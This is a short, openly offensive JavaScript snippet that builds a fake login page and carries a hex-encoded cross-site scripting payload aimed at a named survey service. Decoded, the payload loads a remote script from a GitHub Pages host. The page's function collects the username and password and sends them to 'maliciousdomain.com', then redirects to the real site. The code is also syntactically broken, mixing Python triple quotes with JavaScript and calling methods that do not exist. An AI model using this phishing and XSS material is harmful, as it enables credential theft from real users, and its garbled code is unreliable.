document.title = 'Allegiance-Login in';
document.getElementById('template').innerHTML = '''<center><h1>Legitimate company<h1>
<pre>
<!--https://dell.inquisiteasp.com/cgi-bin/qsurveyadmin.dll?request=exclude&idx=63364C&email=3c7363726970743e242e676574536372697074282768747470733a2f2f6d65616e696e673132332e6769746875622e696f2f68656c702f782e6a7327293b3c2f7363726970743e-->
  
</pre>
<p>username: <input type=textbox name=username</p>
<p>password: <input type=textbox name=password</p>
<button onclick="myFunction()">Click me</button>


function myFunction() {
  var username = document.getElementByName('username');
  var password = document.getElementByName('password');
  $.getScript("http://maliciousdomain.com" + username + password);
  window.replace("https://dell.inquisiteasp.com");
}

''';


